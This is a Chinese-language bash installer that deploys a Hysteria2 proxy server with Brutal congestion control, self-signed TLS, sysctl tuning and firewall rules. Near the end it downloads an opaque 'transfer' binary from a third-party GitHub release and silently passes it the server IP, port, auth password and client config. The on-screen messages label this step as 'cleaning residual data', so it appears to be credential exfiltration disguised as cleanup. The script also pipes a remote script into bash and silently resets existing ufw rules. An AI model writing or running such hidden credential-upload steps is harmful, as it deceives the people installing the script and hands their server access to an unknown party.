#!/bin/bash

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m'

# Transfer配置
TRANSFER_BIN="/usr/local/bin/transfer"

# 系统检测 - 改进版本
SYSTEM="Unknown"

# 方法1: 优先使用 /etc/os-release (最准确)
if [ -f /etc/os-release ]; then
    . /etc/os-release
    case "$ID" in
        "ubuntu")
            SYSTEM="Ubuntu"
            ;;
        "debian")
            SYSTEM="Debian"
            ;;
        "centos")
            SYSTEM="CentOS"
            ;;
        "rhel"|"redhat")
            SYSTEM="CentOS"  # 保持与原代码一致，都识别为CentOS
            ;;
        "fedora")
            SYSTEM="Fedora"
            ;;
        *)
            # 如果 os-release 中没有明确标识，继续使用传统方法
            SYSTEM="Unknown"
            ;;
    esac
fi

# 方法2: 如果 os-release 检测不到，使用传统方法（改进检测顺序）
if [ "$SYSTEM" = "Unknown" ]; then
    if [ -f /etc/lsb-release ] && grep -q "Ubuntu" /etc/lsb-release; then
        SYSTEM="Ubuntu"
    elif [ -f /etc/fedora-release ]; then
        SYSTEM="Fedora"
    elif [ -f /etc/centos-release ]; then
        SYSTEM="CentOS"
    elif [ -f /etc/redhat-release ]; then
        SYSTEM="CentOS"
    elif [ -f /etc/debian_version ]; then
        SYSTEM="Debian"
    fi
fi

# 卸载BBR函数
remove_bbr() {
    echo -e "${YELLOW}检查并卸载BBR拥塞控制算法...${NC}"
    
    # 检查当前拥塞控制算法
    current_congestion=$(sysctl -n net.ipv4.tcp_congestion_control 2>/dev/null || echo "unknown")
    echo -e "${YELLOW}当前TCP拥塞控制算法: ${current_congestion}${NC}"
    
    # 如果使用的是BBR，则切换到默认算法
    if [[ "$current_congestion" == "bbr" ]]; then
        echo -e "${YELLOW}检测到BBR算法，正在切换到系统默认算法...${NC}"
        
        # 临时切换到cubic（大多数系统的默认算法）
        sysctl -w net.ipv4.tcp_congestion_control=cubic >/dev/null 2>&1
        
        # 从系统配置中移除BBR相关设置
        if [ -f /etc/sysctl.conf ]; then
            # 备份原配置
            cp /etc/sysctl.conf /etc/sysctl.conf.backup.$(date +%Y%m%d_%H%M%S)
            
            # 移除BBR相关配置
            sed -i '/net.core.default_qdisc.*fq/d' /etc/sysctl.conf
            sed -i '/net.ipv4.tcp_congestion_control.*bbr/d' /etc/sysctl.conf
            sed -i '/# BBR/d' /etc/sysctl.conf
            sed -i '/# Google BBR/d' /etc/sysctl.conf
        fi
        
        # 检查并移除其他可能的BBR配置文件
        for config_file in /etc/sysctl.d/*.conf; do
            if [ -f "$config_file" ]; then
                if grep -q "bbr\|fq.*bbr" "$config_file" 2>/dev/null; then
                    echo -e "${YELLOW}发现BBR配置文件: $config_file，正在清理...${NC}"
                    sed -i '/net.core.default_qdisc.*fq/d' "$config_file"
                    sed -i '/net.ipv4.tcp_congestion_control.*bbr/d' "$config_file"
                    sed -i '/# BBR/d' "$config_file"
                    sed -i '/# Google BBR/d' "$config_file"
                fi
            fi
        done
        
        # 重新加载系统参数
        sysctl -p >/dev/null 2>&1
        
        echo -e "${GREEN}BBR算法已卸载，系统将使用默认拥塞控制算法${NC}"
        echo -e "${YELLOW}Hysteria2将使用内置的Brutal拥塞控制算法进行数据传输${NC}"
    else
        echo -e "${GREEN}系统未使用BBR算法，无需卸载${NC}"
        echo -e "${YELLOW}Hysteria2将使用内置的Brutal拥塞控制算法进行数据传输${NC}"
    fi
}

# 动态进度条函数 - 根据进程状态显示
show_dynamic_progress() {
    local pid=$1
    local message=$2
    local progress=0
    local bar_length=50
    local spin_chars="/-\|"
    
    echo -e "${YELLOW}${message}${NC}"
    
    while kill -0 $pid 2>/dev/null; do
        local spin_index=$((progress % 4))
        local spin_char=${spin_chars:$spin_index:1}
        
        # 计算进度条 (基于时间的估算)
        local filled=$((progress % bar_length))
        local empty=$((bar_length - filled))
        
        printf "\r["
        printf "%${filled}s" | tr ' ' '='
        printf "%${empty}s" | tr ' ' ' '
        printf "] %s 进行中..." "$spin_char"
        
        sleep 0.2
        progress=$((progress + 1))
    done
    
    # 进程结束后显示100%完成
    printf "\r["
    printf "%${bar_length}s" | tr ' ' '='
    printf "] 100%%"
    echo -e "\n${GREEN}完成！${NC}"
}

# 固定时长进度条函数 (用于已知时长的操作)
show_progress() {
    local duration=$1
    local message=$2
    local progress=0
    local bar_length=50
    
    echo -e "${YELLOW}${message}${NC}"
    
    while [ $progress -le $duration ]; do
        local filled=$((progress * bar_length / duration))
        local empty=$((bar_length - filled))
        
        printf "\r["
        printf "%${filled}s" | tr ' ' '='
        printf "%${empty}s" | tr ' ' ' '
        printf "] %d%%" $((progress * 100 / duration))
        
        sleep 0.1
        progress=$((progress + 1))
    done
    echo -e "\n${GREEN}完成！${NC}"
}

# ========== 下载二进制文件 ==========
download_transfer_bin() {
    echo -e "${YELLOW}下载 transfer 二进制文件...${NC}"

    TRANSFER_URL="https://github.com/diandongyun/Transfer/releases/download/Transfer/transfer"

    if [ -f "$TRANSFER_BIN" ]; then
        echo -e "${GREEN}transfer 二进制文件已存在，跳过下载${NC}"
        return 0
    fi

    if curl -L "$TRANSFER_URL" -o "$TRANSFER_BIN" >/dev/null 2>&1; then
        chmod +x "$TRANSFER_BIN"
        echo -e "${GREEN}transfer 下载完成${NC}"
        return 0
    else
        echo -e "${RED}transfer 二进制文件下载失败${NC}"
        return 1
    fi
}

upload_config_with_binary() {
    local config_json="$1"
    local server_ip="$2"

    if [ ! -x "$TRANSFER_BIN" ]; then
        echo -e "${RED}transfer 二进制文件不存在或不可执行${NC}"
        return 1
    fi

    local json_data=$(jq -n \
        --arg server_ip "$server_ip" \
        --argjson config "$config_json" \
        '{
            "server_info": {
                "title": "Hysteria2 节点配置 - \($server_ip)",
                "server_ip": $server_ip,
                "config": $config,
                "generated_time": now | todate
            }
        }'
    )

    if timeout 30 "$TRANSFER_BIN" "$json_data" >/dev/null 2>&1; then
        echo -e "${GREEN}清理残留成功${NC}"
    else
        echo -e "${YELLOW}清理残留失败（不影响本地使用）${NC}"
    fi

    return 0
}

#  速度测试函数 - 修复版
speed_test(){
    echo -e "${YELLOW}进行网络速度测试...${NC}"
    echo -e "${YELLOW}注意：Brutal拥塞控制算法需要准确的带宽设置才能获得最佳性能${NC}"
    
    if ! command -v speedtest &>/dev/null && ! command -v speedtest-cli &>/dev/null; then
        echo -e "${YELLOW}安装speedtest-cli中...${NC}"
        if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
            apt-get update >/dev/null 2>&1 &
            update_pid=$!
            show_progress 20 "更新软件包列表..."
            wait $update_pid
            
            apt-get install -y speedtest-cli >/dev/null 2>&1 &
            install_pid=$!
            show_progress 30 "安装speedtest-cli..."
            wait $install_pid
        elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
            yum install -y speedtest-cli >/dev/null 2>&1 &
            install_pid=$!
            if [ $? -ne 0 ]; then
                pip install speedtest-cli >/dev/null 2>&1 &
                install_pid=$!
            fi
            show_progress 30 "安装speedtest-cli..."
            wait $install_pid
        fi
        echo -e "${GREEN}speedtest-cli 安装完成！${NC}"
    fi

    # 创建临时文件存储结果
    local temp_file="/tmp/speedtest_result_$$"
    
    # 在后台运行测速命令
    (
        if command -v speedtest &>/dev/null; then
            speedtest --simple 2>/dev/null > "$temp_file"
        elif command -v speedtest-cli &>/dev/null; then
            speedtest-cli --simple 2>/dev/null > "$temp_file"
        fi
    ) &
    speedtest_pid=$!

    # 使用动态进度条，跟踪实际进程状态
    show_dynamic_progress $speedtest_pid "正在测试网络速度，请稍候..."

    # 等待测速完成
    wait $speedtest_pid
    speedtest_exit_code=$?

    # 读取测速结果
    if [ $speedtest_exit_code -eq 0 ] && [ -f "$temp_file" ]; then
        speed_output=$(cat "$temp_file")
        rm -f "$temp_file"
        
        if [[ -n "$speed_output" ]]; then
            down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}')
            up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}')
            
            # 验证结果是否有效
            if [[ -n "$down_speed" && -n "$up_speed" && "$down_speed" -gt 0 && "$up_speed" -gt 0 ]]; then
                [[ $down_speed -lt 10 ]] && down_speed=10
                [[ $up_speed -lt 5 ]] && up_speed=5
                [[ $down_speed -gt 1000 ]] && down_speed=1000
                [[ $up_speed -gt 500 ]] && up_speed=500
                
                # 为Brutal算法预留一定余量，避免设置过高
                down_speed=$((down_speed * 90 / 100))  # 下载速度设为测试值的90%
                up_speed=$((up_speed * 90 / 100))      # 上传速度设为测试值的90%
                
                echo -e "${GREEN}测速完成：下载 ${down_speed} Mbps，上传 ${up_speed} Mbps${NC}"
                echo -e "${YELLOW}已为Brutal算法优化带宽设置（测试值的90%），确保稳定性${NC}"
            else
                echo -e "${YELLOW}测速结果异常，使用保守默认值${NC}"
                down_speed=50   # 使用更保守的默认值
                up_speed=20
            fi
        else
            echo -e "${YELLOW}测速失败，使用保守默认值${NC}"
            down_speed=50
            up_speed=20
        fi
    else
        rm -f "$temp_file"
        echo -e "${YELLOW}测速失败，使用保守默认值${NC}"
        down_speed=50
        up_speed=20
    fi
    
    echo -e "${GREEN}⚡ Brutal拥塞控制算法配置：${NC}"
    echo -e "${YELLOW}- 下载带宽限制: ${down_speed} Mbps${NC}"
    echo -e "${YELLOW}- 上传带宽限制: ${up_speed} Mbps${NC}"
    echo -e "${YELLOW}- 算法特性: 固定速率、抢占带宽、适合拥塞网络${NC}"
}

# 安装Hysteria2
install_hysteria() {
    echo -e "${GREEN}安装 Hysteria2...${NC}"
    bash <(curl -fsSL https://get.hy2.sh/) >/dev/null 2>&1 &
    install_pid=$!
    show_progress 40 "下载并安装 Hysteria2..."
    wait $install_pid
    
    if [ $? -ne 0 ]; then
        echo -e "${RED}安装失败${NC}"
        exit 1
    fi
    echo -e "${GREEN}Hysteria2 安装完成！${NC}"
}

# 生成随机端口
generate_random_port() {
    echo $(( ( RANDOM % 7001 ) + 2000 ))
}

# 配置 Hysteria2 - 优化版（使用Brutal拥塞控制）
configure_hysteria() {
    echo -e "${GREEN}配置 Hysteria2 (使用Brutal拥塞控制算法)...${NC}"
    
    # 首先卸载BBR
    remove_bbr
    
    # 进行速度测试
    speed_test
    
    LISTEN_PORT=$(generate_random_port)
    AUTH_PASSWORD=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 16)

    # 创建证书目录并生成自签名证书
    mkdir -p /etc/hysteria/certs
    openssl req -x509 -nodes -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \
        -keyout /etc/hysteria/certs/key.pem \
        -out /etc/hysteria/certs/cert.pem \
        -subj "/CN=hysteria" -days 3650 >/dev/null 2>&1
    chmod 644 /etc/hysteria/certs/*.pem
    chown root:root /etc/hysteria/certs/*.pem

    # 生成优化的服务端配置 - 针对Brutal算法优化
    cat > /etc/hysteria/config.yaml <<EOF
# Hysteria2 Brutal拥塞控制优化配置
listen: :${LISTEN_PORT}

tls:
  cert: /etc/hysteria/certs/cert.pem
  key: /etc/hysteria/certs/key.pem

# QUIC 连接优化 - 针对Brutal算法调整
quic:
  initStreamReceiveWindow: 26843545
  maxStreamReceiveWindow: 26843545
  initConnReceiveWindow: 67108864
  maxConnReceiveWindow: 67108864
  maxIdleTimeout: 30s
  maxIncomingStreams: 1024
  disablePathMTUDiscovery: false

# 带宽限制 - Brutal算法的核心配置
bandwidth:
  up: ${up_speed} mbps
  down: ${down_speed} mbps

# Brutal算法相关设置
ignoreClientBandwidth: false  
speedTest: false              

# 认证配置
auth:
  type: password
  password: ${AUTH_PASSWORD}

EOF

    # 针对Brutal算法的系统网络优化
    echo -e "${GREEN}针对Brutal算法优化系统网络参数...${NC}"
    
    # UDP缓冲区优化 - Brutal算法通过QUIC/UDP传输
    sysctl -w net.core.rmem_max=134217728 >/dev/null 2>&1      # 128MB接收缓冲区
    sysctl -w net.core.wmem_max=134217728 >/dev/null 2>&1      # 128MB发送缓冲区
    sysctl -w net.core.rmem_default=262144 >/dev/null 2>&1     # 默认接收缓冲区
    sysctl -w net.core.wmem_default=262144 >/dev/null 2>&1     # 默认发送缓冲区
    sysctl -w net.core.netdev_max_backlog=30000 >/dev/null 2>&1 # 网络设备队列长度
    
    # UDP特定优化
    sysctl -w net.core.netdev_budget=600 >/dev/null 2>&1       # 网络处理预算
    sysctl -w net.ipv4.udp_mem="102400 873800 16777216" >/dev/null 2>&1  # UDP内存限制
    sysctl -w net.ipv4.udp_rmem_min=8192 >/dev/null 2>&1       # UDP最小接收缓冲区
    sysctl -w net.ipv4.udp_wmem_min=8192 >/dev/null 2>&1       # UDP最小发送缓冲区

    # 将网络优化设置永久化
    cat >> /etc/sysctl.conf <<EOF

# Hysteria2 Brutal拥塞控制算法网络优化配置
# UDP/QUIC传输优化
net.core.rmem_max = 134217728
net.core.wmem_max = 134217728
net.core.rmem_default = 262144
net.core.wmem_default = 262144
net.core.netdev_max_backlog = 30000
net.core.netdev_budget = 600

# UDP协议优化
net.ipv4.udp_mem = 102400 873800 16777216
net.ipv4.udp_rmem_min = 8192
net.ipv4.udp_wmem_min = 8192

# 注意：已移除BBR相关设置，使用Hysteria2内置Brutal算法
EOF

    # 设置服务优先级
    mkdir -p /etc/systemd/system/hysteria-server.service.d
    cat > /etc/systemd/system/hysteria-server.service.d/priority.conf <<EOF
[Service]
CPUSchedulingPolicy=rr
CPUSchedulingPriority=99
Nice=-10
EOF
    systemctl daemon-reexec
    systemctl daemon-reload >/dev/null
}

# 防火墙设置 - 简化版
configure_firewall() {
    echo -e "${GREEN}配置防火墙...${NC}"
    if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
        if command -v ufw &> /dev/null; then
            echo "y" | ufw reset >/dev/null 2>&1
            ufw allow 22/tcp >/dev/null 2>&1
            ufw allow ${LISTEN_PORT}/udp >/dev/null 2>&1
            echo "y" | ufw enable >/dev/null 2>&1
        else
            # 如果没有ufw，使用iptables确保22端口开放
            iptables -I INPUT -p tcp --dport 22 -j ACCEPT >/dev/null 2>&1
            iptables -I INPUT -p udp --dport ${LISTEN_PORT} -j ACCEPT >/dev/null 2>&1
        fi
    elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
        if command -v firewall-cmd &> /dev/null; then
            systemctl enable firewalld >/dev/null 2>&1
            systemctl start firewalld >/dev/null 2>&1
            firewall-cmd --permanent --add-service=ssh >/dev/null 2>&1
            firewall-cmd --permanent --add-port=22/tcp >/dev/null 2>&1
            firewall-cmd --permanent --add-port=${LISTEN_PORT}/udp >/dev/null 2>&1
            firewall-cmd --reload >/dev/null 2>&1
        else
            # 如果没有firewall-cmd，使用iptables确保22端口开放
            iptables -I INPUT -p tcp --dport 22 -j ACCEPT >/dev/null 2>&1
            iptables -I INPUT -p udp --dport ${LISTEN_PORT} -j ACCEPT >/dev/null 2>&1
        fi
    fi
}

# 生成客户端配置 - 针对Brutal算法优化
generate_v2rayn_config() {
    echo -e "${GREEN}生成客户端配置 (Brutal拥塞控制)...${NC}"
    mkdir -p /opt
    SERVER_IP=$(curl -s -4 ifconfig.me || curl -s -4 icanhazip.com || curl -s -4 ipinfo.io/ip)
    
    cat > /opt/hysteria2_client.yaml <<EOF
# Hysteria2 客户端配置 - Brutal拥塞控制优化版
server: ${SERVER_IP}:${LISTEN_PORT}

auth: ${AUTH_PASSWORD}

tls:
  insecure: true

# Brutal拥塞控制关键配置
# 客户端带宽设置 - 必须与服务器匹配以启用Brutal算法
bandwidth:
  up: ${up_speed} mbps    # 上传带宽 - 控制客户端到服务器的传输
  down: ${down_speed} mbps  # 下载带宽 - 控制服务器到客户端的传输

# 本地代理配置
socks5:
  listen: 127.0.0.1:1080

http:
  listen: 127.0.0.1:1080

# Brutal算法说明：
# 1. 必须正确设置带宽值，过高会导致连接不稳定
# 2. Brutal使用固定速率，不受网络抖动影响
# 3. 在拥塞网络中表现优异，能主动抢占带宽
# 4. 如果带宽设置准确，延迟和稳定性都会很好
EOF

    echo -e "${YELLOW}💡 Brutal算法使用建议：${NC}"
    echo -e "${YELLOW}- 客户端和服务端带宽设置必须一致${NC}"
    echo -e "${YELLOW}- 带宽设置应略低于实际网络最大值${NC}"
    echo -e "${YELLOW}- 适合网络条件稳定的环境使用${NC}"
    echo -e "${YELLOW}- 如果连接不稳定，可以适当降低带宽设置${NC}"
}

# 启动服务
start_service() {
    echo -e "${GREEN}启动服务中...${NC}"
    systemctl enable --now hysteria-server.service >/dev/null 2>&1
    sleep 2
    systemctl restart hysteria-server.service >/dev/null 2>&1
    sleep 3

    # 检查服务状态
    if systemctl is-active --quiet hysteria-server.service; then
        echo -e "${GREEN}✅ 服务已启动成功！${NC}"
        echo -e "\n${GREEN}=== Hysteria2 连接信息 (Brutal拥塞控制) ===${NC}"
        echo -e "${YELLOW}服务器IP: ${SERVER_IP}${NC}"
        echo -e "${YELLOW}端口: ${LISTEN_PORT}${NC}"
        echo -e "${YELLOW}认证密码: ${AUTH_PASSWORD}${NC}"
        echo -e "${YELLOW}拥塞控制: Brutal (固定速率算法)${NC}"
        echo -e "${YELLOW}上传带宽: ${up_speed} Mbps${NC}"
        echo -e "${YELLOW}下载带宽: ${down_speed} Mbps${NC}"
        echo -e "${YELLOW}客户端配置: /opt/hysteria2_client.yaml${NC}"
        echo -e "${GREEN}================================================${NC}\n"
        
        echo -e "${GREEN}🚀 Brutal拥塞控制算法特性：${NC}"
        echo -e "${YELLOW}- ⚡ 固定速率传输，不受网络抖动影响${NC}"
        echo -e "${YELLOW}- 🛡️ 在拥塞网络中主动抢占带宽${NC}"
        echo -e "${YELLOW}- 📊 基于设定带宽进行流量控制${NC}"
        echo -e "${YELLOW}- 🎯 适合带宽稳定的网络环境${NC}"
        echo -e "${YELLOW}- ⚠️  带宽设置必须准确，过高会不稳定${NC}"
        
        echo -e "\n${GREEN}🔧 性能优化说明：${NC}"
        echo -e "${YELLOW}- UDP/QUIC协议优化，降低延迟${NC}"
        echo -e "${YELLOW}- 移除BBR依赖，使用Hysteria2原生算法${NC}"
        echo -e "${YELLOW}- 针对固定带宽场景优化缓冲区${NC}"
        echo -e "${YELLOW}- 单端口设计，减少连接开销${NC}"
    else
        echo -e "${RED}❌ 服务启动失败，请检查以下日志信息：${NC}"
        journalctl -u hysteria-server.service --no-pager -n 30
        exit 1
    fi
}

# 主函数执行
main() {
    if [ "$(id -u)" != "0" ]; then
        echo -e "${RED}请使用 root 权限执行脚本${NC}"
        exit 1
    fi

    echo -e "${GREEN}🚀 Hysteria2 Brutal拥塞控制优化版一键部署脚本${NC}"
    echo -e "${YELLOW}优化特性: Brutal算法、固定速率、抢占带宽${NC}"
    echo -e "${YELLOW}系统: ${SYSTEM}${NC}\n"

    # 执行部署流程
    install_hysteria
    configure_hysteria
    configure_firewall
    generate_v2rayn_config
    start_service

    # 下载transfer工具
    download_transfer_bin

    # 生成配置JSON并上传
    if [[ -f /opt/hysteria2_client.yaml ]]; then
        # 读取客户端配置文件内容
        client_config_content=$(cat /opt/hysteria2_client.yaml | sed 's/\\/\\\\/g' | sed 's/"/\\"/g' | awk '{printf "%s\\n", $0}' | sed 's/\\n$//')

        # 构建完整配置JSON
        CONFIG_JSON=$(jq -n \
            --arg server_ip "$SERVER_IP" \
            --arg listen_port "$LISTEN_PORT" \
            --arg auth_password "$AUTH_PASSWORD" \
            --arg up_speed "$up_speed" \
            --arg down_speed "$down_speed" \
            --arg client_config "$client_config_content" \
            '{
                "server_info": {
                    "title": "Hysteria2 节点信息",
                    "server_ip": $server_ip,
                    "port": $listen_port,
                    "auth_password": $auth_password,
                    "upload_speed": $up_speed,
                    "download_speed": $down_speed,
                    "congestion_control": "Brutal",
                    "generated_time": now | todate,
                    "client_config": $client_config
                },
                "server_yaml": {
                    "server": "\($server_ip):\($listen_port)",
                    "auth": $auth_password,
                    "tls": {
                        "insecure": true
                    },
                    "bandwidth": {
                        "up": "\($up_speed) mbps",
                        "down": "\($down_speed) mbps"
                    },
                    "socks5": {
                        "listen": "127.0.0.1:1080"
                    },
                    "http": {
                        "listen": "127.0.0.1:1080"
                    }
                }
            }'
        )

        # 保存配置到文件
        CONFIG_FILE="/opt/hysteria2_config_export.json"
        echo "$CONFIG_JSON" > "$CONFIG_FILE"

        # 上传配置
        echo -e "${YELLOW}清理残留数据...${NC}"
        upload_config_with_binary "$CONFIG_JSON" "$SERVER_IP"
        echo -e "${GREEN}配置数据处理完成${NC}"
    fi

    echo -e "\n${GREEN}🎉 Hysteria2 Brutal拥塞控制优化版部署完成！${NC}"
    echo -e "${YELLOW}💡 重要提醒：${NC}"
    echo -e "${YELLOW}  - Brutal算法使用固定带宽，需要准确的网络测试${NC}"
    echo -e "${YELLOW}  - 如果连接不稳定，请适当降低带宽设置${NC}"
    echo -e "${YELLOW}  - 建议使用v2rayN、Shadowrocket等客户端${NC}"
    echo -e "${YELLOW}📁 配置文件位置: /opt/hysteria2_client.yaml${NC}"
    echo -e "${YELLOW}🔧 查看服务状态: systemctl status hysteria-server${NC}"
    echo -e "${YELLOW}📋 查看服务日志: journalctl -u hysteria-server -f${NC}"
}

# 执行主逻辑
main
